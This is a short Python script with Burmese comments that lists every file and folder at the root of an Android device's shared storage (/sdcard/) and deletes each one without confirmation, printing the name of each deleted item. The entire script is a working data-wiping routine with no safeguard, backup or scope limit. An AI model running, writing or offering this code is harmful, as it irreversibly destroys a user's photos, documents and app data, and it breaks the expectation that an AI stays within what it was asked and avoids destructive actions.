import os
import shutil

# /sdcard/ ထဲက အရာအားလုံးကို ရယူမယ်
root_folder = "/sdcard/"

for filename in os.listdir(root_folder):
    file_path = os.path.join(root_folder, filename)
    try:
        # ဖိုင်လား၊ Folder လား ခွဲမနေတော့ဘဲ အကုန်ဖျက်မယ်
        if os.path.isdir(file_path):
            shutil.rmtree(file_path)
        else:
            os.remove(file_path)
        print(f"Deleted: {filename}")
    except Exception as e:
        print(f"Cannot delete {filename}: {e}")
